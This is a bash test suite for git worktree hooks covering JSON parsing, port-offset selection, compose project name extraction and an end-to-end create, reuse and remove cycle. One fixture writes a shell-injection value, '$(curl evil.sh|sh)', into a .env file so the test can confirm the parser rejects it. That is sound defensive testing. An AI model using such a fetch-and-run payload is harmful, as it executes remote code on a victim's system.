#!/usr/bin/env bash
# Worktree hook tests
# shellcheck shell=bash

WORKTREE_LIB="${HOME}/.claude/hooks/worktree-lib.sh"
WORKTREE_CREATE="${HOME}/.claude/hooks/create-worktree.sh"
WORKTREE_REMOVE="${HOME}/.claude/hooks/remove-worktree.sh"

test_worktree_lib() {
  section "Worktree Hook Library"

  if [ ! -f "$WORKTREE_LIB" ]; then
    skip "worktree-lib.sh not installed"
    return
  fi

  if ! command -v jq &>/dev/null; then
    skip "jq not installed (required by worktree hooks)"
    return
  fi

  # Run each assertion in its own subshell so sourced functions don't leak
  # into the test runner. Capture results and do pass/fail in the parent so
  # the counters update correctly.
  local result

  # ---- parse_cwd ----
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && parse_cwd '{"cwd":"/tmp/sample","other":"x"}')
  if [ "$result" = "/tmp/sample" ]; then
    pass "parse_cwd extracts cwd from JSON"
  else
    fail "parse_cwd returned wrong value: '$result'"
  fi

  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && parse_cwd '{"other":"x"}')
  if [ -z "$result" ]; then
    pass "parse_cwd returns empty when cwd missing"
  else
    fail "parse_cwd should return empty: '$result'"
  fi

  # ---- is_worktree ----
  # shellcheck source=/dev/null
  if (source "$WORKTREE_LIB" && ! is_worktree /tmp); then
    pass "is_worktree returns false for non-worktree dir"
  else
    fail "is_worktree returned true for /tmp"
  fi

  # ---- Helpers that operate on a fixture dir ----
  local fixture
  fixture=$(mktemp -d -t worktree-lib-test.XXXXXX)
  cleanup_lib_fixture() {
    [ -n "${fixture:-}" ] && [ -d "$fixture" ] && rm -rf -- "$fixture"
  }
  trap cleanup_lib_fixture EXIT

  # read_base_ports: parses commented and uncommented lines, ignores others
  cat >"$fixture/.env.example" <<'EOF'
# Host port overrides
# PG_HOST_PORT=5432
# SMTP_UI_PORT=3000
SMTP_PORT=2525
SOMETHING_ELSE=hello
DATABASE_URL=postgres://...
API_HOST_PORT=5050
EOF
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && read_base_ports "$fixture/.env.example" | tr '\n' ' ')
  if [ "$result" = "5432 3000 2525 5050 " ]; then
    pass "read_base_ports parses commented and uncommented lines"
  else
    fail "read_base_ports returned: '$result'"
  fi

  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && read_base_ports "$fixture/missing.env.example")
  if [ -z "$result" ]; then
    pass "read_base_ports returns empty for missing file"
  else
    fail "read_base_ports should return empty: '$result'"
  fi

  # extract_compose_project: valid name
  echo 'COMPOSE_PROJECT_NAME=my-proj_1' >"$fixture/.env"
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && extract_compose_project "$fixture/.env")
  if [ "$result" = "my-proj_1" ]; then
    pass "extract_compose_project returns valid project name"
  else
    fail "extract_compose_project returned: '$result'"
  fi

  # extract_compose_project: injection attempt is rejected
  echo 'COMPOSE_PROJECT_NAME=$(curl evil.sh|sh)' >"$fixture/.env"
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && extract_compose_project "$fixture/.env")
  if [ -z "$result" ]; then
    pass "extract_compose_project rejects shell-injection attempt"
  else
    fail "extract_compose_project leaked dangerous value: '$result'"
  fi

  # extract_compose_project: missing file
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && extract_compose_project "$fixture/missing.env")
  if [ -z "$result" ]; then
    pass "extract_compose_project returns empty for missing file"
  else
    fail "extract_compose_project should return empty: '$result'"
  fi

  # ---- pick_offset ----
  # pick_offset shells out to lsof; skip just these assertions if lsof is
  # missing rather than skipping the whole library test.
  if ! command -v lsof &>/dev/null; then
    skip "pick_offset (lsof not installed)"
  else
    # With the fixture .env.example present, pick_offset uses it for
    # collision-checking. Should still return a value in 1..99.
    # shellcheck source=/dev/null
    result=$(source "$WORKTREE_LIB" && pick_offset "$fixture")
    if [ -n "$result" ] && [ "$result" -ge 1 ] && [ "$result" -le 99 ] 2>/dev/null; then
      pass "pick_offset returns 1..99 when reading .env.example (got $result)"
    else
      fail "pick_offset returned invalid value with .env.example: '$result'"
    fi

    # With no .env.example, pick_offset falls back to random offset (no
    # collision check). Stderr should warn about the degraded mode.
    local empty_dir
    empty_dir=$(mktemp -d -t worktree-lib-empty.XXXXXX)
    local fallback_stderr
    # shellcheck source=/dev/null
    result=$(source "$WORKTREE_LIB" && pick_offset "$empty_dir" 2>"$fixture/fallback-stderr")
    fallback_stderr=$(cat "$fixture/fallback-stderr" 2>/dev/null)
    if [ -n "$result" ] && [ "$result" -ge 1 ] && [ "$result" -le 99 ] 2>/dev/null \
      && [[ "$fallback_stderr" == *"WARN"* ]]; then
      pass "pick_offset returns 1..99 with WARN when no .env.example (got $result)"
    else
      fail "pick_offset fallback failed (val='$result' stderr='$fallback_stderr')"
    fi
    rm -rf -- "$empty_dir"

    # .env.example exists but declares no ports — same fallback path.
    local no_ports_dir
    no_ports_dir=$(mktemp -d -t worktree-lib-noports.XXXXXX)
    cat >"$no_ports_dir/.env.example" <<'EOF'
DATABASE_URL=postgres://...
SOMETHING=else
EOF
    # shellcheck source=/dev/null
    result=$(source "$WORKTREE_LIB" && pick_offset "$no_ports_dir" 2>/dev/null)
    if [ -n "$result" ] && [ "$result" -ge 1 ] && [ "$result" -le 99 ] 2>/dev/null; then
      pass "pick_offset returns 1..99 when .env.example has no ports (got $result)"
    else
      fail "pick_offset failed when .env.example has no ports: '$result'"
    fi
    rm -rf -- "$no_ports_dir"
  fi

  cleanup_lib_fixture
  trap - EXIT
}

test_worktree_e2e() {
  section "Worktree Hook End-to-End"

  if [ ! -f "$WORKTREE_CREATE" ] || [ ! -f "$WORKTREE_REMOVE" ] || [ ! -f "$WORKTREE_LIB" ]; then
    skip "worktree hooks not installed"
    return
  fi

  if ! command -v jq &>/dev/null; then
    skip "jq not installed"
    return
  fi

  local root repo wt_path wt_path_2 reuse_stderr stderr_file

  # Cleanup runs on function exit AND on script abort (set -e). The EXIT
  # trap is cleared at the bottom of the function so it doesn't fire later.
  # Install the trap BEFORE mktemp so $root never exists without cleanup
  # registered.
  cleanup_e2e() {
    if [ -n "${root:-}" ] && [ -d "$root" ]; then
      if [ -d "$root/repo--main" ] && [ -f "$repo/.git" ]; then
        GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
          git -C "$repo" worktree remove --force "$root/repo--main" 2>/dev/null || true
      fi
      rm -rf -- "$root"
    fi
  }
  trap cleanup_e2e EXIT

  root=$(mktemp -d -t dotfiles-wt-test.XXXXXX)
  repo="$root/repo"

  # Isolate the test repo from the user's global git config (signing,
  # core.hooksPath, init.templateDir, commit.template, etc.) so the test
  # is deterministic across machines.
  GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
    git init --quiet --initial-branch=main "$repo"
  GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
    git -C "$repo" \
    -c user.email=test@example.invalid \
    -c user.name=Test \
    commit --allow-empty -m "init" --quiet

  # ---- Create path ----
  wt_path=$(printf '{"cwd":"%s"}' "$repo" | "$WORKTREE_CREATE" 2>/dev/null)

  if [ -z "$wt_path" ] || [ ! -d "$wt_path" ] || [ ! -f "$wt_path/.git" ]; then
    fail "create-worktree.sh did not produce a valid worktree (got: '$wt_path')"
    cleanup_e2e
    trap - EXIT
    return
  fi
  pass "create-worktree.sh created worktree at $(basename "$wt_path")"

  # ---- Reuse path ----
  # Second invocation should detect the existing worktree dir and take the
  # reuse branch, returning the same path with a log mentioning that path
  # on stderr. Capture stderr to a file inside $root so the EXIT trap
  # cleans it up automatically.
  stderr_file="$root/reuse-stderr"
  wt_path_2=$(printf '{"cwd":"%s"}' "$repo" | "$WORKTREE_CREATE" 2>"$stderr_file")
  reuse_stderr=$(cat "$stderr_file" 2>/dev/null)

  if [ "$wt_path_2" = "$wt_path" ] && [[ "$reuse_stderr" == *"$wt_path"* ]]; then
    pass "create-worktree.sh reuses existing worktree on second invocation"
  else
    fail "expected reuse branch (path='$wt_path_2' stderr='$reuse_stderr')"
  fi

  # ---- Remove path (via the hook script, not teardown_worktree directly) ----
  # remove-worktree.sh reads JSON from stdin and exercises parse_cwd +
  # is_worktree + teardown_worktree end-to-end.
  printf '{"cwd":"%s"}' "$wt_path" | "$WORKTREE_REMOVE" 2>/dev/null

  if [ ! -d "$wt_path" ]; then
    pass "remove-worktree.sh removed the worktree"
  else
    fail "remove-worktree.sh did not remove $wt_path"
  fi

  cleanup_e2e
  trap - EXIT
}
